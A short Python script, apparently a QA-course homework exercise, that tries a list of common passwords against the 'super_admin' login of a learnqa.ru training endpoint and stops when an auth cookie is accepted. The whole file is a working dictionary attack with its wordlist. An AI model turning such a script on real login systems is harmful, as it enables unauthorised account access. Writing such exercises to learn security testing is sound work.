import requests

passwords = ["password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567", "letmein", "trustno1",
             "dragon", "baseball", "111111", "iloveyou", "master", "sunshine", "ashley", "bailey", "passw0rd",
             "shadow", "123123", "654321", "superman", "qazwsx", "michael", "Football", "1234567", "welcome",
             "football", "jesus", "ninja", "mustang", "password1", "000000", "azerty", "princess", "12345",
             "1234", "photoshop", "1234567890", "admin", "adobe123", "123456789", "access", "696969", "batman",
             "starwars", "solo", "qwertyuiop", "login", "1qaz2wsx", "121212", "flower", "hottie", "loveme",
             "zaq1zaq1", "freedom", "hello", "666666", "654321", "!@#$%^&*", "charlie", "aa123456", "donald",
             "qwerty123", "123qwe", "888888", "777777", "lovely", "555555", "1q2w3e4r"]


for password in passwords:
    res_1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": password})
    cookie_value = res_1.cookies.get("auth_cookie")

    res_2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie": cookie_value})

    if res_2.text == "You are NOT authorized":
        continue
    elif res_2.text == "You are authorized":
        print(res_2.text)
        print(password)
        break
